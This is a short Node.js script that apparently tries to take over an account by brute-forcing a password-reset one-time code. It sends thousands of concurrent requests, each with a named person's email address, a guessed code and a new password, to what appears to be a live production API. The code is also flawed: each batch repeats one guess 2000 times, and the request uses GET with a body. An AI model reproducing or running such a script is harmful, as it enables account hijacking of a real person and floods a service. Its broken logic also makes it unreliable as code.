const axios = require("axios");

async function makeRequest(otp) {
  try {
    let data = JSON.stringify({
      email: "swarnikarajsingh@gmail.com",
      otp: otp,
      newpassword: "asdsdss",
    });

    let config = {
      method: "get",
      maxBodyLength: Infinity,
      url: "https://bsapiprod.analytics-hub.com/bs/user/?userId=6463aa1a-dc4a-4c80-9e6f-d8dc49a3b1a95",
      headers: {
        "Content-Type": "application/json",
      },
      data: data,
    };
    console.log("malking request");
    let r = await axios.request(config);
    console.log(r.data);
    console.log("request sent)");
  } catch (err) {
    console.log(err);
  }
}

async function main() {
  for (let i = 0; i < 9999999999; i += 2000) {
    let p = [];
    for (let j = 0; j < 2000; j++) {
      console.log(i);
      p.push(makeRequest(i.toString()));
    }
    await Promise.all(p);
  }
}
main();
